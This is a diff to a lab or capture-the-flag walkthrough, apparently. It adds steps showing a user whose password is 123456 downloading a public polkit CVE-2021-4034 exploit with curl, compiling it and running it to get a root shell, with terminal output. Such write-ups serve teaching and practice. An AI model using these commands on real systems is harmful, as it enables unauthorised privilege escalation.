@@ -504,7 +504,29 @@ Session completed.
 ```
 - And this shows jennifer's password is **123456**
 
-- Once we have logged in as jennifer we can download the polkit exploit
+- Once we have logged in as jennifer we can download the polkit exploit and compile it
+```
+jennifer@srv-99-590:~$ curl https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > ex.c
+<tent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c > pwnkit.c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1267  100  1267    0     0   3218      0 --:--:-- --:--:-- --:--:--  3223
+jennifer@srv-99-590:~$ ls
+ls
+ex.c
+jennifer@srv-99-590:~$ gcc ex.c -o ex
+```
 
+- Finally we can run the exploit to get root 
+```
+jennifer@srv-99-590:~$ ./ex
+./ex
+# whoami
+whoami
+root
+#
+```
+
+### Method - 3
 
 
